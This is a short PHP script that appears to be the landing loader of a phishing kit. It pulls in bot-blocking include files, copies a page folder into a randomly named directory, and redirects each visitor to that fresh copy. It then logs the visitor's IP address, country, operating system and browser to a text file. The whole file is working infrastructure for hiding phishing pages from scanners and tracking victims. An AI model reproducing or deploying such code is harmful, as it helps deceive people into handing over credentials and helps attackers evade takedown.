<?php 

include './blockerz.php';
include './blockerz2.php';
include './sc.php';
    

$random = rand(0,100000000000);
$DIR    = substr(md5($random), 0, 15);
function recurse_copy($home,$DIR) {
$dir = opendir($home);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($home . '/' . $file) ) {
recurse_copy($home . '/' . $file,$DIR . '/' . $file);
}
else {
copy($home . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$home="ro";
recurse_copy( $home,$DIR );
header("location:$DIR");
$file = fopen("vu.txt","a");
fwrite($file,$ip2."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$cn | $os | $br] \n");

?>
    